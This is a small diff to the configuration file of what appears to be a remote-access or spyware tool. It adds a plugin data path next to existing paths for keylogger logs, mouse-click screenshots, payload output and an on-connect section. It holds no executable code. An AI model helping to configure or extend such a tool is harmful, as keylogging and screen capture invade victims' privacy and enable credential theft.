@@ -136,6 +136,7 @@ records = data/%c
 keystrokes = data/keylogger/%c/%t.log
 mouseshots = data/mouselogger/%c/%w-%t.png
 payload_output = output
+plugins = data/plugindata
 
 [on_connect]
 
